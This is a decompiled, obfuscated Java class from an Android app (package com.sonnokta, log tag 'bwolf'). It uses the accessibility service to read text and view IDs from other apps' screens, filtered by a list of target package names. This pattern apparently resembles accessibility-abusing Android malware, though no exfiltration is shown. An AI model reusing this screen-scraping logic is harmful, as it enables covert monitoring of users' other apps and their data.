package fddo;

import android.content.Context;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import com.sonnokta.p023w;
import com.sonnokta.utils.LogUtil;

import java.util.Iterator;
import java.util.List;

/* renamed from: fddo.try  reason: invalid class name */
public class Ctry {

    private static String TAG = "bwolf-Ctry";

    /* renamed from: case  reason: not valid java name */
    protected String f80case = "";

    /* renamed from: else  reason: not valid java name */
    protected String f81else = "";

    /* renamed from: fddo  reason: collision with root package name */
    protected boolean f130fddo;

    /* renamed from: for  reason: not valid java name */
    protected String f82for;

    /* renamed from: goto  reason: not valid java name */
    protected String f83goto = null;
    protected Context ifdf;

    /* renamed from: new  reason: not valid java name */
    protected fddo f84new;

    /* renamed from: this  reason: not valid java name */
    protected p023w f85this;

    /* renamed from: try  reason: not valid java name */
    protected String f86try = "";

    public Ctry(Context context, p023w p023w, String str, String str2, boolean z) {
        this.ifdf = context;
        this.f85this = p023w;
        this.f82for = str;
        this.f84new = new fddo(p023w);
        this.f130fddo = z;
        if (!str2.equals("*") && !str2.endsWith("|")) {
            str2 = str2 + "|";
        }
        this.f81else = str2;
    }

    /* renamed from: case  reason: not valid java name */
    public String m161case() {
        LogUtil.showErrorLog(TAG, "--- m161case ---");
        String str = this.f83goto;
        if (str != null) {
            return str;
        }
        if (this.f130fddo) {
            Log.w(">>LayBase", "getActivity: _activity is null");
        }
        return "";
    }

    /* renamed from: else  reason: not valid java name */
    public boolean m162else() {
        LogUtil.showErrorLog(TAG, "--- m162else ---");
        String lowerCase = Cgoto.m137throw(this.ifdf, 15).toLowerCase();
        String lowerCase2 = Cgoto.m133super(this.ifdf).toLowerCase();
        Iterator<Object> it = m165new("widget.TextView").iterator();
        while (it.hasNext()) {
            CharSequence text = ((AccessibilityNodeInfo) it.next()).getText();
            if (text != null) {
                String lowerCase3 = text.toString().toLowerCase();
                if (lowerCase3.length() <= lowerCase2.length() && lowerCase3.startsWith(lowerCase)) {
                    return true;
                }
            }
        }
        return false;
    }

    public boolean fddo(String str) {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        String str2;
        if (str.equals("*") || str.isEmpty()) {
            return true;
        }
        try {
            str2 = this.f85this.m20this().getPackageName().toString();
        } catch (Exception unused) {
            str2 = "";
        }
        if (!str.endsWith("|")) {
            str = str + "|";
        }
        StringBuilder sb = new StringBuilder();
        sb.append(str2);
        sb.append("|");
        return str.contains(sb.toString());
    }

    /* renamed from: for  reason: not valid java name */
    public boolean m163for() {
        LogUtil.showErrorLog(TAG, "--- m163for ---");
        if (!fddo(this.f81else)) {
            return false;
        }
        if (!this.f86try.isEmpty()) {
            String[] split = this.f86try.split(",");
            if (split.length > 0) {
                for (String str : split) {
                    if (fddo.m90else(this.f85this.m20this(), str) == null) {
                        if (this.f130fddo) {
                            Log.d(">>LayBase", "checks: required ID " + str + " not found");
                        }
                        return false;
                    }
                }
            }
        }
        if (this.f80case.isEmpty()) {
            return true;
        }
        String[] split2 = this.f80case.split(",");
        if (split2.length <= 0) {
            return true;
        }
        for (String str2 : split2) {
            if (fddo.m90else(this.f85this.m20this(), str2) != null) {
                if (this.f130fddo) {
                    Log.d(">>LayBase", "checks: forbidden ID " + str2 + " is found");
                }
                return false;
            }
        }
        return true;
    }

    /* renamed from: goto  reason: not valid java name */
    public boolean m164goto() {
        LogUtil.showErrorLog(TAG, "--- m164goto ---");
        String lowerCase = Cgoto.m115extends(this.ifdf, 10).toLowerCase();
        if (lowerCase.isEmpty()) {
            return false;
        }
        Iterator<Object> it = m165new("widget.TextView").iterator();
        while (it.hasNext()) {
            CharSequence text = ((AccessibilityNodeInfo) it.next()).getText();
            if (text != null && text.toString().toLowerCase().startsWith(lowerCase)) {
                return true;
            }
        }
        return false;
    }

    public boolean ifdf(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        LogUtil.showErrorLog(TAG, "--- ifdf ---");
        String viewIdResourceName;
        if (accessibilityNodeInfo == null) {
            return false;
        }
        if (!str.isEmpty() && (viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName()) != null && viewIdResourceName.endsWith(str)) {
            return true;
        }
        if (!str2.isEmpty() && accessibilityNodeInfo.getText() != null) {
            String lowerCase = accessibilityNodeInfo.getText().toString().toLowerCase();
            for (String trim : str2.split("\\|")) {
                if (lowerCase.contains(trim.trim().toLowerCase())) {
                    return true;
                }
            }
        }
        return false;
    }

    /* renamed from: new  reason: not valid java name */
    public List<Object> m165new(String str) {
        LogUtil.showErrorLog(TAG, "--- m165new ---");
        return fddo.m86break(this.f85this.m20this(), str);
    }

    /* renamed from: this  reason: not valid java name */
    public void m166this(String str) {
        LogUtil.showErrorLog(TAG, "--- m166this ---");
        this.f83goto = str;
    }

    /* renamed from: try  reason: not valid java name */
    public int m167try(String str) {
        LogUtil.showErrorLog(TAG, "--- m167try ---");
        return fddo.m86break(this.f85this.m20this(), str).size();
    }
}
